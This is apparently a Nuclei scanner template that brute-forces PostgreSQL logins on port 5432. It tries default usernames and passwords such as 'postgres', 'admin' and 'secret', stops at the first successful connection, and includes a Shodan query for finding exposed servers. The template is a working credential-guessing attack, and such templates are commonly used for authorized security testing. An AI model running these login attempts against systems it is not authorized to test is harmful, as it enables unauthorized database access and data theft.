id: postgres-brute
info:
  name: Brute Force Postgres
  author: Ice3man
  severity: high
  metadata:
    shodan-query: "port:5432"

javascript:
  - pre-condition: |
      var m = require("nuclei/postgres");
      var c = m.PGClient();
      c.IsPostgres(Host, Port);

    code: |
      var m = require("nuclei/postgres");
      var c = m.PGClient();
      c.Connect(Host, Port, User, Pass);
  
    args:
      Host: "{{Host}}"
      Port: "5432"
      User: "{{usernames}}"
      Pass: "{{passwords}}"

    payloads:
      usernames:
        - "postgres"
        - "admin"
      passwords:
        - "password"
        - "secret"
        - "admin"
        - "postgres"
    attack: clusterbomb
    stop-at-first-match: true
    
    matchers:
      - type: dsl
        dsl:
          - "response == true"
          - "success == true"
        condition: and